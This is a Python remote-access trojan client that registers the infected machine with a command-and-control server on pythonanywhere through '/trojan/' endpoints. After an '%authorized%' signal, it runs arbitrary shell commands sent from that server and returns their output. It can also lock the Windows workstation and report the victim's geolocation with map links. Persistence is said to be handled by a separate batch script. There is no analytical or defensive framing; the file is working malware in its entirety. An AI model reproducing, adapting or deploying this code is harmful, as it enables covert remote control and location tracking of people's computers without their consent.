import datetime
with open('log.txt', 'w') as f:
    f.write(f'\n[INFO] (mainline): "Starting at {datetime.datetime.now()}"')
try:
    import pickle
    import random
    import socket
    import os
    import shutil
except ImportError as e:
    with open('log.txt', 'a') as f:
        f.write(f'\n[ERROR] (ERROR 1) "System imports": {e}')
else:
    with open('log.txt', 'a') as f:
        f.write('\n[INFO] (Done 1): "System imports"')

try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
with open('log.txt', 'a') as f:
    f.write('\n[INFO] (Done 2) "Download imports"')

# NTWRK SCAN LOGIC
while True:
    try:
        requests.get('https://google.com')
    except Exception:
        continue
    else:
        break
with open('log.txt', 'a') as f:
    f.write('\n[INFO] (Done 3) "Network Scan"')

try:
    import geocoder
except ImportError:
    try:
        os.popen('pip install geocoder').read()
    except Exception:
        os.system('git clone https://github.com/DenisCarriere/geocoder')
        os.chdir('geocoder')
        os.system('python3 setup.py install')
class Socket:
    def __init__(self):
        self.role = None
        self.address = None
        self.base_url = 'https://stonevalley.pythonanywhere.com'

    def connect(self, addr=None):
        if addr:
            response = requests.get(f'{self.base_url}/trojan/connect/{addr}').json()
        else:
            response = requests.get(f'{self.base_url}/trojan/connect/None').json()
        if not response['success']:
            return False
        else:
            self.address = response['address']
            self.role = 'client'
            return True

    def connections(self):
        response = requests.get(f'{self.base_url}/trojan/connections').json()
        return response['data']

    def bind(self, addr=None):
        if addr:
            response = requests.get(f'{self.base_url}/trojan/bind/{addr}').json()
        else:
            response = requests.get(f'{self.base_url}/trojan/bind/None').json()
        if response['success']:
            self.address = response['address']
            self.role = 'server'
            return True
        else:
            return False
    def accept(self):
        resp = requests.get(f'{self.base_url}/trojan/accept/{self.address}').json()
        if resp['success']:
            if resp['connected']:
                return True

    def send(self, data):
        resp = requests.post(f'{self.base_url}/trojan/send/{self.address}/{self.role}', json=data)
        return resp

    def recv(self):
        resp = requests.get(f'{self.base_url}/trojan/recv/{self.address}/{self.role}')
        return resp.json()['data'] if resp.json()['success'] else None

    def close(self):
        resp = requests.get(f'{self.base_url}/trojan/close/{self.address}/{self.role}')
        return resp.json()['success']
with open('log.txt', 'a') as f:
    f.write('\n[INFO] (Done 4) "1.Load Geocoder 2.Set classes"')

# We leave startup
with open('log.txt', 'a') as f:
    f.write('\n[SKIP] (Skipping 5) "Startup movement is handled by batch script"')


host = socket.gethostbyname(socket.gethostname())
address = f'EA0001-{os.name}-{socket.gethostname()}' # WARNING, check in the client before setting address
# each address should be unique

with open('log.txt', 'a') as f:
    f.write('\n[INFO] (Done 6) "Predefined Server_Address is set"')

if 'object.pkl' in os.listdir():
    with open('log.txt', 'a') as f:
        f.write('\n[WAIT] (Doing 7) "Loading socket configuration from existing file"')

    with open('object.pkl', 'rb') as file:
        try:
            sock = pickle.load(file)
        except EOFError as e:
            with open('log.txt', 'a') as f:
                f.write(f'\n[ERROR] (Error 7.1) "Socket-config file is corrupt": {e}')

            sock = Socket()
        else:
            with open('log.txt', 'a') as f:
                f.write('\n[WAIT] (Doing 7.1) "Loaded pickle socket config"')

    if sock.address in sock.connections():
        with open('log.txt', 'a') as f:
            f.write('\n[DONE] (Doing 7.2) "Socket is ready and available in sock.connections()"')

        pass
    else:
        with open('log.txt', 'a') as f:
            f.write('\n[WAIT] (Doing 7.2) "Binding a new socket"')

        sock = Socket()
        try:
            r = sock.bind(f'virat-{address}')
        except Exception as e3:
            with open('log.txt', 'a') as f:
                f.write(f'\n[Error] (Error 7.3) "Binding failed! QUITTING...": {e3}')
            exit(-1)
        else:
            if r:
                file = open('object.pkl', 'wb')
                pickle.dump(sock, file)
                with open('log.txt', 'a') as f:
                    f.write('\n[Done] (Done 7.3) "Bound a new socket"')
            else: # the predefined Enterprise Account socket must be on
                # close the previous buggy socket
                with open('log.txt', 'a') as f:
                    f.write('\n[WAIT] (Doing 7.3) "Closing existing buggy socket"')
                resp = requests.get(f'{sock.base_url}/trojan/close/virat-{address}/server')
                if str(resp.json()['success']) == 'True':
                    with open('log.txt', 'a') as f:
                        f.write('\n[Done] (Done 7.3) "Socket closed"')
                    with open('log.txt', 'a') as f:
                        f.write('\n[WAIT] (Doing 7.4) "Binding new socket again"')
                    sock = Socket()
                    try:
                        r = sock.bind(f'virat-{address}')
                    except Exception as e3:
                        with open('log.txt', 'a') as f:
                            f.write(f'\n[Error] (Error 7.4) "Binding failed! QUITTING...": {e3}')

                        exit(-1)
                    else:
                        if r:
                            with open('log.txt', 'a') as f:
                                f.write(f'\n[Done] (Done 7.4) "Socket Bound!": ')
                        else:
                            with open('log.txt', 'a') as f:
                                f.write(f'\n[Error] (Error 7.4) "Binding failed! No reason"')
                else:
                    with open('log.txt', 'a') as f:
                        f.write(f'\n[Error] (Error 7.3) "Cant close previous socket.": {resp.json()["message"]}')



else:
    with open('log.txt', 'a') as f:
        f.write('\n[WAIT] (Doing 7) "Binding a new socket"')

    sock = Socket()
    try:
        r = sock.bind(f'virat-{address}')
    except Exception as e:
        with open('log.txt', 'a') as f:
            f.write(f'\n[ERROR] (Error 7) "Cant bind virat-socket": {e}')
        exit(-1)
    else:
        if r:
            with open('object.pkl', 'wb') as file:
                pickle.dump(sock, file)
            with open('log.txt', 'a') as f:
                f.write('\n[DONE] (Done 7) "Bound virat-socket"')

# Listen for conns
with open('log.txt', 'a') as f:
    f.write('\n[WAIT] (Doing 8) "Receiving Connections"')
while True:
    try:
        conn = sock.accept()
    except KeyboardInterrupt:
        with open('log.txt', 'a') as f:
            f.write('\n[KeyboardInterrupt] (Error 8.1) "Closing Socket"')
        sock.close()
        quit(-1)
    except requests.exceptions.ConnectionError:
        try:
            requests.get(sock.base_url)
        except Exception:
            with open('log.txt', 'a') as f:
                f.write('\n[ServerDown] (Error 8.2) "can not receive connections"')
            quit(-1)
        conn = False
        pass
    if conn:
        break
with open('log.txt', 'a') as f:
    f.write('\n[DONE] (Done 9) "Accepted a new connection"')
sock.send(f'%iam:{host}%')
auth = False


def get_location():
    result = requests.get('https://geolocation-db.com/json/').json()
    return (result['latitude']),(result['longitude']),("\033[1;95mCountry: \033[1;97m" + result['country_name'] +
            ", \033[1;95mState: \033[1;97m" + result['state'] +
            ", \033[1;95mCity: \033[1;97m" + result['city'])
with open('log.txt', 'a') as f:
    f.write('\n[DONE] (Done 10) "Sent host-id"')

try:
    with open('log.txt', 'a') as f:
        f.write('\n[WAIT] (Doing 11) "Receiving commands"')
    while True:
        try:
            data = sock.recv()
        except Exception or KeyboardInterrupt:
            data = None
        if data == "%authorized%":
            auth = True
        if auth:
            if '%SHELL%' in str(data):
                data = data.split('%SHELL%')[1]
                if data in ['$lock', '$location']:
                    if data == '$lock':
                        sock.send('Locked!')
                        os.system("Rundll32.exe user32.dll,LockWorkStation")
                    elif data == '$location':
                        lat, lng, loc = get_location()
                        googlelink = f"https://www.google.com/maps/place/{lat},{lng}"
                        binglink = f"https://bing.com/maps/default.aspx?cp={lat}~{lng}"
                        loc_data = f"Exact Location: {loc}\nGoogle Link: {googlelink}\nBing Link: {binglink}\nLat, Lng: {lat},{lng}"
                        sock.send(loc_data)
                elif data in ['exit', 'bye', 'quit']:
                    sock.send('Bye! We should meet again ;)')
                    raise InterruptedError
                else:
                    output = os.popen(data).read()
                    if 'is not recognized as an internal or external command,' in output:
                        sock.send('INVALID')
                    else:
                        if len(output) < 1:
                            output = 'Successfully Executed'
                        sock.send(str(output))
except (Exception or InterruptedError or KeyboardInterrupt):
    with open('object.pkl', 'wb') as file:
        pickle.dump(sock, file)
    with open('log.txt', 'a') as f:
        f.write('\n[DONE] (Done 11) "Closing after running commands"')

    sock.close()
    quit(-1)
